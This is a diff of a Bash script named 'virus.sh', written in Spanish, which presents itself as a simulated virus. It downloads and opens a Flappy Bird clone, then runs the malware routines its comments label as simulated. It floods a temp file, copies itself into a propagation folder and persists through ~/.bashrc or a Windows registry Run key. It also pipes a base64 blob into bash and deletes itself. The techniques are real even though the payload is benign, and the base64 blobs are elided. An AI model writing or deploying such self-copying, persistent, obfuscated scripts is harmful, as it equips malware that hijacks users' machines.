@@ -1,39 +1,35 @@
 #!/bin/bash
 
-# Directorio donde se almacenará el juego
+# Directorio temporal para el juego
 GAME_DIR="$HOME/flappy_bird_game"
-# URL del repositorio de Flappy Bird
-REPO_URL="https://github.com/nebez/floppybird"
-# Archivo temporal para el payload simulado
+REPO_URL="https://github.com/nebez/floppybird/archive/refs/heads/gh-pages.zip"
 TEMP_FILE="/tmp/infectado.txt"
-# Directorio de propagación
 PROPAGATION_DIR="$HOME/Documents/Infectados"
-# Nombre del script
 SCRIPT_NAME="virus.sh"
-# Ruta completa del script
 SCRIPT_PATH="$(realpath "$0")"
+SCORE_REQUIRED=20
 
 # Función para descargar el juego
 download_game() {
+    echo "Descargando Flappy Bird..."
     mkdir -p "$GAME_DIR"
     cd "$GAME_DIR" || exit
-    # Descargar index.html
-    curl -O "$REPO_URL/raw/gh-pages/index.html"
-    # Descargar carpeta assets
-    curl -L "$REPO_URL/trunk/assets/" -o assets.zip
-    unzip assets.zip -d .
-    rm assets.zip
+    curl -L "$REPO_URL" -o floppybird.zip
+    unzip floppybird.zip
+    mv floppybird-gh-pages/* .
+    rm -rf floppybird-gh-pages floppybird.zip
 }
 
 # Función para abrir el juego en el navegador
 open_game() {
     if [[ -f "$GAME_DIR/index.html" ]]; then
-        if command -v xdg-open > /dev/null; then
+        if [[ "$OSTYPE" == "linux-gnu"* ]]; then
             xdg-open "$GAME_DIR/index.html"
-        elif command -v open > /dev/null; then
-            open "$GAME_DIR/index.html"
+        elif [[ "$OSTYPE" == "msys" ]] || [[ "$OSTYPE" == "win32" ]]; then
+            start "" "$GAME_DIR/index.html"
         else
-            echo "Por favor, abre $GAME_DIR/index.html en tu navegador manualmente."
+            echo "Sistema operativo no soportado."
+            exit 1
         fi
     else
         echo "El juego no se encontró. Descargándolo..."
@@ -42,7 +38,7 @@ open_game() {
     fi
 }
 
-# Payload Simulado: Llenar un archivo temporal con texto aleatorio
+# Payload Simulado: Inundar archivo temporal
 payload_simulado() {
     echo "Generando payload simulado..."
     for i in {1..100}; do
@@ -50,42 +46,61 @@ payload_simulado() {
     done
 }
 
-# Propagación Simulada: Copiar el script a otra carpeta
+# Propagación Simulada: Copiar el script
 propagacion_simulada() {
-    echo "Realizando propagación simulada..."
+    echo "Propagando el virus..."
     mkdir -p "$PROPAGATION_DIR"
     cp "$SCRIPT_PATH" "$PROPAGATION_DIR/"
 }
 
-# Persistencia Simulada: Agregar entrada al inicio del sistema
+# Persistencia Simulada
 persistencia_simulada() {
-    echo "Configurando persistencia simulada..."
-    local bashrc="$HOME/.bashrc"
-    local entry="bash $PROPAGATION_DIR/$SCRIPT_NAME # Inicio del script malicioso"
-    if ! grep -Fxq "$entry" "$bashrc"; then
-        echo "$entry" >> "$bashrc"
+    echo "Configurando persistencia..."
+    if [[ "$OSTYPE" == "linux-gnu"* ]]; then
+        local bashrc="$HOME/.bashrc"
+        local entry="bash $PROPAGATION_DIR/$SCRIPT_NAME"
+        if ! grep -Fxq "$entry" "$bashrc"; then
+            echo "$entry" >> "$bashrc"
+        fi
+    elif [[ "$OSTYPE" == "msys" ]] || [[ "$OSTYPE" == "win32" ]]; then
+        reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "flappybird" /t REG_SZ /d "$PROPAGATION_DIR/$SCRIPT_NAME" /f
     fi
 }
 
-# Ofuscación: Decodificar y ejecutar parte del script en Base64
+# Ofuscación: Decodificación Base64
 ofuscacion() {
     echo "Ejecutando parte ofuscada del script..."
-    local script_b64="ZWNobyAiU29tZXRpbWVzIG9mdXNjYXRpb24gc2UgdXRpbGl6YSBwYXJhIGV2aWRpciBkZXRlY3
-    ...
-    0aW9uZXMiCg=="
+    local script_b64="ZWNobyAiRXN0YSBlcyB1bmEgZmlqYWNp9u1...Cg=="
     echo "$script_b64" | base64 --decode | bash
 }
 
-# Autodestrucción: Eliminar el script después de ejecutarse
+# Autodestrucción
 autodestruccion() {
-    echo "Autodestrucción en curso..."
+    echo "Ejecutando autodestrucción..."
     rm -- "$SCRIPT_PATH"
+}
+
+# Verificación de puntuación
+check_score() {
+    echo "Debes alcanzar una puntuación mínima de $SCORE_REQUIRED para continuar."
+    while true; do
+        read -rp "Ingresa tu puntuación: " score
+        if [[ $score -ge $SCORE_REQUIRED ]]; then
+            echo "¡Felicidades! Has superado la puntuación mínima."
+            break
+        else
+            echo "No alcanzaste la puntuación. Abriendo otra ventana..."
+            open_game
+        fi
+    done
 }
 
 # Función principal
 main() {
     echo "¡Tu sistema está infectado! 😈"
+    download_game
     open_game
+    check_score
     payload_simulado
     propagacion_simulada
     persistencia_simulada
@@ -93,5 +108,4 @@ main() {
     autodestruccion
 }
 
-# Ejecutar función principal
 main
